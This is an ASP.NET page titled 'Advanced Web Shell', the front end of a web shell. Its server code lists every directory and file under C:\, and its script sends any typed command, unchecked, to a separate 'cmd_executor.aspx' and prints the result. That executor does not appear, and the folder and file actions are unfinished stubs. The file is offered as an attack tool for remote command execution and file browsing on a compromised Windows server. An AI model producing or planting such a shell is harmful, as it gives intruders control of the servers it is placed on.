<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Data.SqlClient" %>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <title>Advanced Web Shell</title>
    <style>
        body {
            background-color: #f5f5f5;
        }
        .file-icon {
            font-size: 60px;
            cursor: pointer;
        }
        .file-browser {
            display: flex;
            flex-wrap: wrap;
            margin-top: 20px;
        }
        .file-item {
            text-align: center;
            width: 120px;
            margin: 10px;
        }
        pre {
            background-color: #333;
            color: #fff;
            padding: 10px;
        }
    </style>
</head>
<body>

<div class="container">
    <h2 class="text-center my-4">File Manager & Command Execution</h2>
    
    <div class="file-browser">
        <% 
            string[] dirs = Directory.GetDirectories("C:\\");
            foreach (string dir in dirs) { 
        %>
        <div class="file-item">
            <i class="fas fa-folder file-icon" onclick="openFolder('<%=dir%>')"></i>
            <p><%= Path.GetFileName(dir) %></p>
        </div>
        <% } %>
        <% 
            string[] files = Directory.GetFiles("C:\\");
            foreach (string file in files) { 
        %>
        <div class="file-item">
            <i class="fas fa-file file-icon" onclick="openFile('<%=file%>')"></i>
            <p><%= Path.GetFileName(file) %></p>
        </div>
        <% } %>
    </div>

    <div class="mt-4">
        <h4>Execute Command</h4>
        <input type="text" id="cmdInput" class="form-control" placeholder="Enter command">
        <button class="btn btn-primary mt-2" onclick="executeCommand()">Execute</button>
    </div>

    <pre id="outputConsole"></pre>
</div>

<script>
    function openFolder(path) {
        alert("Opening folder: " + path);
        // Implement AJAX call to load folder content
    }

    function openFile(file) {
        alert("Opening file: " + file);
        // Implement AJAX call to read file content
    }

    function executeCommand() {
        var cmd = document.getElementById('cmdInput').value;
        fetch('cmd_executor.aspx?cmd=' + cmd)
            .then(response => response.text())
            .then(data => {
                document.getElementById('outputConsole').innerText = data;
            });
    }
</script>

</body>
</html>
